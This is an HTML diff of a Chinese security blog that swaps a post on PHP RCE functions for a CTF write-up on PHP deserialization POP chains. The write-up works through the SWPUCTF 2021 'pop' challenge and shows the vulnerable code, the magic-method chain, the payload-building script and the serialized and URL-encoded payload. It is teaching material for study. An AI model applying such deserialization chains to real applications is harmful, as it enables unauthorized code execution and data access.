@@ -9,7 +9,7 @@
   
   <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_4k4bc36ef96';window.REIMU_CONFIG.clipboard_tips = {"success":{"en":"Copy successfully (*^▽^*)"},"fail":{"en":"Copy failed (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = 'All articles on this blog are licensed under the BY-NC-SA license agreement unless otherwise stated. Please indicate the source when reprinting!';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://cl1ck-t0.github.io';</script>
   <title>
-    RCE漏洞原理及利用 | Cl1ck-t0&#39;s blog
+    pop链构造 | Cl1ck-t0&#39;s blog
   </title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
@@ -17,15 +17,15 @@
     
 <link rel="stylesheet" href="/css/loader.css">
 
-    <meta name="description" content="RCE漏洞原理及利用引路题QAQ:NSSCTF-[SWPUCTF 2021 新生赛]babyrce,窝的博客里题解部分也有详解嘿嘿（） 一、RCE漏洞概述web的应用开发中常常为了灵活性与简洁性，让应用调用代码执行函数或系统命令执行函数处理，如果对用户输入过滤不严，容易产生远程代码执行漏洞或命令执行漏洞。 二、常见的RCE漏洞函数1.系统命令执行函数1).system() ;这个相信大家都不陌生(">
+    <meta name="description" content="pop链构造在PHP反序列化漏洞利用中，POP链（Property Oriented Programming Chain） 是通过魔术方法的自动触发机制，将多个类的方法串联起来，最终执行恶意代码的攻击链。核心思路是：找到入口 → 确定尾巴 → 构建中间桥梁。 1. 明确入口与尾巴  入口：常见为 __wakeup()、__destruct() 等在反序列化或对象销毁时自动调用的方法。 尾巴：包含危">
 <meta property="og:type" content="article">
-<meta property="og:title" content="RCE漏洞原理及利用">
-<meta property="og:url" content="https://cl1ck-t0.github.io/2026/02/15/RCE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/index.html">
+<meta property="og:title" content="pop链构造">
+<meta property="og:url" content="https://cl1ck-t0.github.io/2026/02/19/pop%E9%93%BE%E6%9E%84%E9%80%A0/index.html">
 <meta property="og:site_name" content="Cl1ck-t0&#39;s blog">
-<meta property="og:description" content="RCE漏洞原理及利用引路题QAQ:NSSCTF-[SWPUCTF 2021 新生赛]babyrce,窝的博客里题解部分也有详解嘿嘿（） 一、RCE漏洞概述web的应用开发中常常为了灵活性与简洁性，让应用调用代码执行函数或系统命令执行函数处理，如果对用户输入过滤不严，容易产生远程代码执行漏洞或命令执行漏洞。 二、常见的RCE漏洞函数1.系统命令执行函数1).system() ;这个相信大家都不陌生(">
+<meta property="og:description" content="pop链构造在PHP反序列化漏洞利用中，POP链（Property Oriented Programming Chain） 是通过魔术方法的自动触发机制，将多个类的方法串联起来，最终执行恶意代码的攻击链。核心思路是：找到入口 → 确定尾巴 → 构建中间桥梁。 1. 明确入口与尾巴  入口：常见为 __wakeup()、__destruct() 等在反序列化或对象销毁时自动调用的方法。 尾巴：包含危">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2026-02-15T13:13:09.000Z">
-<meta property="article:modified_time" content="2026-02-18T12:24:28.344Z">
+<meta property="article:published_time" content="2026-02-19T08:41:25.000Z">
+<meta property="article:modified_time" content="2026-02-19T13:36:54.323Z">
 <meta property="article:author" content="Cl1ck-t0">
 <meta property="article:tag" content="web">
 <meta property="article:tag" content="web漏洞">
@@ -117,11 +117,11 @@
 <header id="header" aria-label="Site header">
         <picture>
         </picture>
-          <img  fetchpriority="high" src="/images/banner.webp" alt="RCE漏洞原理及利用">
+          <img  fetchpriority="high" src="/images/banner.webp" alt="pop链构造">
   <div id="header-outer">
     <div id="header-title">
           <span id="logo">
-            <h1 data-aos="slide-up">RCE漏洞原理及利用</h1>
+            <h1 data-aos="slide-up">pop链构造</h1>
           </span>
         <h2 id="subtitle-wrap" data-aos="slide-down">
         </h2>
@@ -136,7 +136,7 @@
     <div class="sidebar-wrap" data-aos="fade-up">
           <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
 <div class="sidebar-toc-wrapper toc-div-class" >
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#RCE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8"><span class="toc-number">1.</span> <span class="toc-text">RCE漏洞原理及利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81RCE%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text">一、RCE漏洞概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%B8%B8%E8%A7%81%E7%9A%84RCE%E6%BC%8F%E6%B4%9E%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.</span> <span class="toc-text">二、常见的RCE漏洞函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.1.</span> <span class="toc-text">1.系统命令执行函数</span></a></li></ol></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pop%E9%93%BE%E6%9E%84%E9%80%A0"><span class="toc-number">1.</span> <span class="toc-text">pop链构造</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#eg-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-pop"><span class="toc-number">1.1.</span> <span class="toc-text">eg.[SWPUCTF 2021 新生赛]pop</span></a></li></ol></li></ol>
 </div>
 </div>
           <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -190,13 +190,13 @@
   </div>
 </aside>
 
-          <section id="main" aria-label="Main content"><article id="post-RCE漏洞原理及利用" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+          <section id="main" aria-label="Main content"><article id="post-pop链构造" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-inner" data-aos="fade-up">
     <div class="article-meta">
       <div class="article-date">
   <span class="article-date-link icon-calendar" data-aos="zoom-in">
-    <time datetime="2026-02-15T13:13:09.000Z" itemprop="datePublished">2026-02-15</time>
-    <time style="display: none;" id="post-update-time">2026-02-18</time>
+    <time datetime="2026-02-19T08:41:25.000Z" itemprop="datePublished">2026-02-19</time>
+    <time style="display: none;" id="post-update-time">2026-02-19</time>
   </span>
 </div>
 
@@ -205,34 +205,95 @@
     <div class="hr-line"></div>
     
     <div class="e-content article-entry" itemprop="articleBody">
-        <h1 id="RCE漏洞原理及利用"><a href="#RCE漏洞原理及利用" class="headerlink" title="RCE漏洞原理及利用"></a>RCE漏洞原理及利用</h1><p>引路题QAQ:NSSCTF-[SWPUCTF 2021 新生赛]babyrce,<del>窝的博客里题解部分也有详解嘿嘿</del>（）</p>
-<h2 id="一、RCE漏洞概述"><a href="#一、RCE漏洞概述" class="headerlink" title="一、RCE漏洞概述"></a>一、RCE漏洞概述</h2><p>web的应用开发中常常为了灵活性与简洁性，让应用调用代码执行函数或系统命令执行函数处理，如果对用户输入过滤不严，容易产生远程代码执行漏洞或命令执行漏洞。</p>
-<h2 id="二、常见的RCE漏洞函数"><a href="#二、常见的RCE漏洞函数" class="headerlink" title="二、常见的RCE漏洞函数"></a>二、常见的RCE漏洞函数</h2><h3 id="1-系统命令执行函数"><a href="#1-系统命令执行函数" class="headerlink" title="1.系统命令执行函数"></a>1.系统命令执行函数</h3><p>1).system() ;这个相信大家都不陌生(抬头不见低头见)，能将字符串作为命令执行并返回结果；</p>
-<p>2).exec() ; 也能将字符串作为命令执行，但是只能返回结果的最后一行(至今不知道有什么用emmmmmm)；</p>
-<p>3).shell_exec() ; 能执行命令但不返回结果；</p>
-<p>4).passthru(); 能将字符串作为命令执行，只调用命令不返回任何结果，但把命令的运行结果原样输出到标准输出设备上(这里指的是命令的执行状态，0代表成功，非0代表失败)</p>
+        <h1 id="pop链构造"><a href="#pop链构造" class="headerlink" title="pop链构造"></a>pop链构造</h1><p>在PHP反序列化漏洞利用中，<strong>POP链（Property Oriented Programming Chain）</strong> 是通过魔术方法的自动触发机制，将多个类的方法串联起来，最终执行恶意代码的攻击链。核心思路是：<strong>找到入口 → 确定尾巴 → 构建中间桥梁</strong>。</p>
+<p><strong>1. 明确入口与尾巴</strong></p>
+<ul>
+<li><strong>入口</strong>：常见为 <em>__wakeup()</em>、<em>__destruct()</em> 等在反序列化或对象销毁时自动调用的方法。</li>
+<li><strong>尾巴</strong>：包含危险函数的代码位置，如 <em>eval()</em>、<em>system()</em>、<em>file_put_contents()</em>、<em>include()</em> 等。</li>
+<li>先锁定尾巴，再反向寻找能触发它的调用链。</li>
+</ul>
+<p><strong>2. 利用魔术方法串联</strong> 常用魔术方法及触发条件：</p>
+<ul>
+<li><p><em>__get()</em>：访问不可访问属性时触发。</p>
+</li>
+<li><p><em>__set()</em>：给不可访问属性赋值时触发。</p>
+</li>
+<li><p><em>__call()</em>：调用不存在方法时触发。</p>
+</li>
+<li><p><em>__tostring()</em>：对象被当作字符串使用时触发。</p>
+</li>
+<li><p><em>__invoke()</em>：对象被当作函数调用时触发。</p>
+<p>总之就是</p>
+<p>   1.寻找可利用的魔术方法作为起点，也就是说链头特征是能够被输入内容的并且能被用户所控制的；</p>
+<ol start="2">
+<li>构建方法调用链，连接起点和终点；</li>
+<li>找到危险函数或操作作为终点，也就是说链尾特征是可以读取文件或者能够执行命令的；</li>
+<li>此时我们找到了链尾，正式开始构造pop链，从链尾反推到链头。</li>
+</ol>
+</li>
+</ul>
+<h3 id="eg-SWPUCTF-2021-新生赛-pop"><a href="#eg-SWPUCTF-2021-新生赛-pop" class="headerlink" title="eg.[SWPUCTF 2021 新生赛]pop"></a>eg.[SWPUCTF 2021 新生赛]pop</h3><p>代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">show_source(&quot;index.php&quot;);</span><br><span class="line"></span><br><span class="line">class w44m&#123;</span><br><span class="line"></span><br><span class="line">    private $admin = &#x27;aaa&#x27;;</span><br><span class="line">    protected $passwd = &#x27;123456&#x27;;</span><br><span class="line">    </span><br><span class="line">    public function Getflag()&#123;</span><br><span class="line">        if($this-&gt;admin === &#x27;w44m&#x27; &amp;&amp; $this-&gt;passwd ===&#x27;08067&#x27;)&#123;</span><br><span class="line">            include(&#x27;flag.php&#x27;);</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo $this-&gt;admin;</span><br><span class="line">            echo $this-&gt;passwd;</span><br><span class="line">            echo &#x27;nono&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w22m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        echo $this-&gt;w00m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w33m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public $w22m;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        $this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;();</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$w00m = $_GET[&#x27;w00m&#x27;];</span><br><span class="line">unserialize($w00m);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我们来进行简单分析：</p>
+<p>1.对于w44m类;</p>
+<p>如果变量前是protected，则会在变量名前加上<code>\x00*\x00</code>,</p>
+<p>若是private，则会在变量名前加上<code>\x00类名\x00</code>,输出时一般需要url编码;</p>
+<p>最终目标是调用Getflag()；</p>
+<p>2.对于w22m类；</p>
+<p>当类销毁时会输出<code>$this-&gt;w00m</code>；</p>
+<p>3.对于w33m类；</p>
+<p>当w33m类的对象被当做字符串使用时，触发__toString()方法；</p>
+<p>接着，我们尝试构造一下pop链，</p>
+<ul>
+<li>在w44m类中的Getflag作为尾部</li>
+<li>w33m类中有<code>$this-&gt;w00m-&gt;{$this-&gt;w22m}();</code>，因此我们需要给w00m一个w44m类，给w22m一个Getflag字符串</li>
+<li>而如何调用w33m类中的__toString()方法呢，我们看到w22m类中有<code>echo $this-&gt;w00m;</code>，需要给w00m一个w33m类即可</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">w22m::__destruct()-&gt;w33m::__toString()-&gt;w44m::Getflag()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>接着，我们再尝试构造payload：</p>
+<p>1、首先复制源码到编辑器中<br>将不需要的部分注释掉(和赋值无关的都注释掉)</p>
+<p>以下是删除注释后的剩余部分：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class w44m&#123;</span><br><span class="line"></span><br><span class="line">    private $admin = &#x27;aaa&#x27;;</span><br><span class="line">    protected $passwd = &#x27;123456&#x27;;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w22m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w33m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public $w22m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>2、添加pop链和序列化代码<br>根据前面我们的分析，从pop链的链尾开始赋值<br>私有和保护属性，采用内部赋值；</p>
+<p>对象赋值采用外部赋值：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$a=new w44m();// 创建w44m对象</span><br><span class="line">// 这里$a的属性还没有赋值，保持默认值</span><br><span class="line"></span><br><span class="line">$b=new w33m();</span><br><span class="line">$b-&gt;w00m=$a;//外部赋值：给public属性$w00m赋值</span><br><span class="line">$b-&gt;w22m=Getflag;//外部赋值：给public属性$w22m赋值</span><br><span class="line"></span><br><span class="line">$t=new w22m();</span><br><span class="line">$t-&gt;w00m=$b;</span><br><span class="line">echo serialize($t);</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">echo urlencode(serialize($t));</span><br></pre></td></tr></table></figure>
+
+<p>构造得：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;w22m&quot;:1:&#123;s:4:&quot;w00m&quot;;O:4:&quot;w33m&quot;:2:&#123;s:4:&quot;w00m&quot;;O:4:&quot;w44m&quot;:2:&#123;s:11:&quot;\00w44m\00admin&quot;;s:4:&quot;w44m&quot;;s:9:&quot;\00*\00passwd&quot;;s:5:&quot;08067&quot;;&#125;s:4:&quot;w22m&quot;;s:7:&quot;Getflag&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>URL编码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A4%3A%22w22m%22%3A1%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w33m%22%3A2%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w44m%22%3A2%3A%7Bs%3A11%3A%22%00w44m%00admin%22%3Bs%3A4%3A%22w44m%22%3Bs%3A9%3A%22%00%2A%00passwd%22%3Bs%3A5%3A%2208067%22%3B%7Ds%3A4%3A%22w22m%22%3Bs%3A7%3A%22Getflag%22%3B%7D%7D</span><br></pre></td></tr></table></figure>
+
+<p>然后得到flag。</p>
 
     </div>
     <footer class="article-footer">
         <blockquote class="article-copyright">
     <p><strong><span class="icon-user icon"></span>Author: </strong>Cl1ck-t0</p>
-    <p><strong><span class="icon-link icon"></span>Permalink: </strong><a href="https://cl1ck-t0.github.io/2026/02/15/RCE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/">https://cl1ck-t0.github.io/2026/02/15/RCE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/</a></p>
+    <p><strong><span class="icon-link icon"></span>Permalink: </strong><a href="https://cl1ck-t0.github.io/2026/02/19/pop%E9%93%BE%E6%9E%84%E9%80%A0/">https://cl1ck-t0.github.io/2026/02/19/pop%E9%93%BE%E6%9E%84%E9%80%A0/</a></p>
     
-    <p><strong><span class="icon-calendar icon"></span>Published: </strong>2026-02-15 21:13:09</p>
-    <p><strong><span class="icon-calendar icon"></span>Updated: </strong>2026-02-18 20:24:28</p>
+    <p><strong><span class="icon-calendar icon"></span>Published: </strong>2026-02-19 16:41:25</p>
+    <p><strong><span class="icon-calendar icon"></span>Updated: </strong>2026-02-19 21:36:54</p>
     <p><strong><span class="icon-copyright icon"></span>License: </strong>All articles on this blog are licensed under the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener nofollow noreferrer" target="_blank"><span class="icon-creative-commons"></span>BY-NC-SA</a> license agreement unless otherwise stated. Please indicate the source when reprinting!</p>
     <span class="icon-creative-commons article-copyright-bg"></span>
   </blockquote>
         <div class="share-wrapper">
-    <a href="https://service.weibo.com/share/share.php?url=https%3A%2F%2Fcl1ck-t0.github.io%2F2026%2F02%2F15%2FRCE%25E6%25BC%258F%25E6%25B4%259E%25E5%258E%259F%25E7%2590%2586%25E5%258F%258A%25E5%2588%25A9%25E7%2594%25A8%2F&amp;appkey=&amp;title=RCE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8&amp;pic=&amp;ralateUid=" target="_blank" rel="noopener noreferrer" title="RCE漏洞原理及利用">
+    <a href="https://service.weibo.com/share/share.php?url=https%3A%2F%2Fcl1ck-t0.github.io%2F2026%2F02%2F19%2Fpop%25E9%2593%25BE%25E6%259E%2584%25E9%2580%25A0%2F&amp;appkey=&amp;title=pop%E9%93%BE%E6%9E%84%E9%80%A0&amp;pic=&amp;ralateUid=" target="_blank" rel="noopener noreferrer" title="pop链构造">
       <div class="share-icon icon icon-weibo">
       </div>
     </a>
-    <a href="https://connect.qq.com/widget/shareqq/index.html?url=www.baidu.com&amp;title=RCE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8&amp;desc=RCE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8&amp;source=https%3A%2F%2Fcl1ck-t0.github.io" target="_blank" rel="noopener noreferrer" title="RCE漏洞原理及利用">
+    <a href="https://connect.qq.com/widget/shareqq/index.html?url=www.baidu.com&amp;title=pop%E9%93%BE%E6%9E%84%E9%80%A0&amp;desc=pop%E9%93%BE%E6%9E%84%E9%80%A0&amp;source=https%3A%2F%2Fcl1ck-t0.github.io" target="_blank" rel="noopener noreferrer" title="pop链构造">
       <div class="share-icon icon icon-qq">
       </div>
     </a>
-    <a href="javascript:;"  title="RCE漏洞原理及利用">
+    <a href="javascript:;"  title="pop链构造">
       <div class="share-icon icon icon-weixin">
           <div id="share-weixin">
             <div class="share-weixin-dom">
@@ -260,20 +321,12 @@
     </footer>
   </div>
     <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
-      <div class="article-nav-link-wrap left">
-            <img data-src="/covers/hoshimi-miyabi-dope-3840x2160-20500.jpg" data-sizes="auto" alt="pop链构造" class="lazyload">
-        <a href="/2026/02/19/pop%E9%93%BE%E6%9E%84%E9%80%A0/" aria-label="Prev: pop链构造" title="Prev: pop链构造"></a>
-        <div class="article-nav-caption">Prev</div>
-        <h3 class="article-nav-title">
-            pop链构造
-        </h3>
-      </div>
     <div class="article-nav-link-wrap right">
-          <img data-src="/covers/b29d15932393a8bed07adce825361cae.jpg" data-sizes="auto" alt="PHP&amp;MySQL基础" class="lazyload">
-      <a href="/2026/02/10/PHP-MySQL%E5%9F%BA%E7%A1%80/" aria-label="Next: PHP&amp;MySQL基础"  title="Next: PHP&amp;MySQL基础"></a>
+          <img data-src="/covers/columbina-genshin-3840x2160-23949.jpg" data-sizes="auto" alt="RCE漏洞原理及利用" class="lazyload">
+      <a href="/2026/02/15/RCE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/" aria-label="Next: RCE漏洞原理及利用"  title="Next: RCE漏洞原理及利用"></a>
       <div class="article-nav-caption">Next</div>
       <h3 class="article-nav-title">
-          PHP&amp;MySQL基础
+          RCE漏洞原理及利用
       </h3>
     </div>
   </nav>
@@ -343,7 +396,7 @@
   <div class="sidebar-wrap">
         <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
 <div class="sidebar-toc-wrapper toc-div-class" >
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#RCE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8"><span class="toc-number">1.</span> <span class="toc-text">RCE漏洞原理及利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81RCE%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text">一、RCE漏洞概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%B8%B8%E8%A7%81%E7%9A%84RCE%E6%BC%8F%E6%B4%9E%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.</span> <span class="toc-text">二、常见的RCE漏洞函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.1.</span> <span class="toc-text">1.系统命令执行函数</span></a></li></ol></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pop%E9%93%BE%E6%9E%84%E9%80%A0"><span class="toc-number">1.</span> <span class="toc-text">pop链构造</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#eg-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-pop"><span class="toc-number">1.1.</span> <span class="toc-text">eg.[SWPUCTF 2021 新生赛]pop</span></a></li></ol></li></ol>
 </div>
 </div>
         <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -463,13 +516,13 @@
       <script data-pjax>
         window.REIMU_POST = {
           author: "Cl1ck-t0",
-          title: "RCE漏洞原理及利用",
-          url: "https://cl1ck-t0.github.io/2026/02/15/RCE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/",
+          title: "pop链构造",
+          url: "https://cl1ck-t0.github.io/2026/02/19/pop%E9%93%BE%E6%9E%84%E9%80%A0/",
           excerpt: "",
           description: "",
-          stripContent: "RCE漏洞原理及利用引路题QAQ:NSSCTF-[SWPUCTF 2021 新生赛]babyrce,窝的博客里题解部分也有详解嘿嘿（） 一、RCE漏洞概述web的应用开发中常常为了灵活性与简洁性，让应用调用代码执行函数或系统命令执行函数处理，如果对用户输入过滤不严，容易产生远程代码执行漏洞或命令执行漏洞。 二、常见的RCE漏洞函数1.系统命令执行函数1).system() ;这个相信大家都不陌生(抬头不见低头见)，能将字符串作为命令执行并返回结果； 2).exec() ; 也能将字符串作为命令执",
-          date: "Sun Feb 15 2026 21:13:09 GMT+0800",
-          updated: "Wed Feb 18 2026 20:24:28 GMT+0800",
+          stripContent: "pop链构造在PHP反序列化漏洞利用中，POP链（Property Oriented Programming Chain） 是通过魔术方法的自动触发机制，将多个类的方法串联起来，最终执行恶意代码的攻击链。核心思路是：找到入口 → 确定尾巴 → 构建中间桥梁。 1. 明确入口与尾巴  入口：常见为 __wakeup()、__destruct() 等在反序列化或对象销毁时自动调用的方法。 尾巴：包含危险函数的代码位置，如 eval()、system()、file_put_contents()、inc",
+          date: "Thu Feb 19 2026 16:41:25 GMT+0800",
+          updated: "Thu Feb 19 2026 21:36:54 GMT+0800",
           cover: "/images/banner.webp",
         };
       </script>
